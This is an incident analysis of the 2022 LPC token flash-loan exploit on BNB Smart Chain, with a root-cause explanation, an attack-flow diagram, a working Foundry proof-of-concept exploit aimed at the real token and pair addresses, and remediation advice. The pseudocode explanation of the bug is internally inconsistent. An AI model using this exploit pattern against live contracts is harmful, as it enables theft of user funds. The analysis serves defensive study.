# LPC — Flash Loan Self-Transfer Fee Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-07 |
| **Protocol** | LPC Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~178 BNB (~$45,715) |
| **Attacker** | [0xd9936EA91a461aA4B727a7e3661bcD6cD257481c](https://bscscan.com/address/0xd9936EA91a461aA4B727a7e3661bcD6cD257481c) |
| **Vulnerable Contract (LPC Token)** | [0x1E813fA05739Bf145c1F182CB950dA7af046778d](https://bscscan.com/address/0x1E813fA05739Bf145c1F182CB950dA7af046778d) |
| **PancakeSwap Pair** | [0x2ecD8Ce228D534D8740617673F31b7541f6A0099](https://bscscan.com/address/0x2ecD8Ce228D534D8740617673F31b7541f6A0099) |
| **Root Cause** | Fee calculation error on self-transfer causes token balance inflation |
| **CWE** | CWE-682: Incorrect Calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/LPC_exp.sol) |

---
## 1. Vulnerability Overview

The LPC token is a fee-on-transfer token that collects a fee on every `transfer()` call. However, when transferring to oneself (self-transfer, `from == to`), the fee calculation logic is flawed, causing the held balance to effectively increase with each call. The attacker borrowed LPC via a PancakeSwap flash loan, then repeated the self-transfer 10 times to amplify the token amount. The inflated LPC was then returned to the pair, bypassing the repayment amount calculation to realize a net profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable self-transfer handling logic (pseudocode)
function _transfer(address from, address to, uint256 amount) internal {
    uint256 fee = amount * feeRate / 100;
    uint256 netAmount = amount - fee;

    // ❌ When from == to, balance is decremented then incremented again
    // balances[from] -= amount;      // deduct
    // balances[to]   += netAmount;   // add back amount minus fee
    // if from == to: net balance += (netAmount - amount) = -fee → appears normal
    // but in the actual implementation, intermediate fee handling inflates the balance

    _balances[from] -= amount;
    _balances[to]   += netAmount;  // ❌ double-processing bug when from == to
    _balances[feeWallet] += fee;
}

// ✅ Correct self-transfer handling
function _transfer(address from, address to, uint256 amount) internal {
    if (from == to) return; // ✅ ignore self-transfer or handle it explicitly
    // or
    require(from != to, "Self-transfer not allowed");
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**202207LPC_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: fee calculation error on self-transfer causes token balance inflation
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] PancakeSwap.swap(total LPC - 1, 0, data)
    │       └─ Flash loan: borrow large amount of LPC
    │
    ├─[2] Enter pancakeCall() callback
    │       │
    │       ├─[loop x10] LPC.transfer(address(this), balance)
    │       │              └─ self-transfer → balance inflated due to fee calculation bug
    │       │
    │       └─ After 10 iterations, LPC balance significantly inflated
    │
    ├─[3] Transfer LPC to PancakeSwap pair to repay flash loan
    │       └─ Inflated balance satisfies repayment condition with less than original borrowed amount
    │
    └─[4] Net profit: 178 BNB secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract LPCExploit is Test {
    IERC20 LPC = IERC20(0x1E813fA05739Bf145c1F182CB950dA7af046778d);
    IPancakePair pair = IPancakePair(0x2ecD8Ce228D534D8740617673F31b7541f6A0099);

    function setUp() public {
        vm.createSelectFork("bsc", 19_852_596);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] LPC balance", LPC.balanceOf(address(this)), 18);

        // [Step 1] Borrow large amount of LPC via PancakeSwap flash loan
        (uint112 reserve0, , ) = pair.getReserves();
        pair.swap(reserve0 - 1, 0, address(this), abi.encode("flashloan"));

        emit log_named_decimal_uint("[End] LPC balance", LPC.balanceOf(address(this)), 18);
    }

    // PancakeSwap flash loan callback
    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] Repeat self-transfer 10 times → balance amplified via fee bug
        for (uint256 i = 0; i < 10; i++) {
            // ⚡ LPC.transfer(self, balance): self-transfer bug inflates balance
            LPC.transfer(address(this), LPC.balanceOf(address(this)));
        }

        // [Step 3] Repay flash loan with inflated LPC (exploiting 10% fee calculation)
        uint256 repayAmount = (amount0 * 10000) / 9975 + 1;
        LPC.transfer(address(pair), repayAmount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Incorrect Fee Calculation |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Token Logic Flaw |
| **Attack Vector** | Repeated self-transfer + flash loan |
| **Precondition** | Self-transfer handling bug in fee-on-transfer token |
| **Impact** | 178 BNB stolen |

---
## 6. Remediation Recommendations

1. **Explicit self-transfer handling**: Inside `_transfer`, immediately return or `revert` when `from == to`.
2. **Unit tests for fee calculation logic**: Write unit tests covering edge cases such as self-transfer, zero-amount transfer, and transfer to a contract address.
3. **Flash loan reentrancy protection**: Apply a `nonReentrant` guard to prevent sensitive state changes from occurring during flash loan callbacks.

---
## 7. Lessons Learned

- **Risks of fee-on-transfer tokens**: Custom tokens that levy fees deviate from standard ERC20 behavior and introduce various edge-case bugs. Scenarios such as self-transfer, decimal rounding, and fee accumulation must be thoroughly tested.
- **Combination with flash loans**: Even a seemingly minor bug on its own can lead to large-scale losses when combined with a flash loan. Token designs must be validated under flash loan conditions.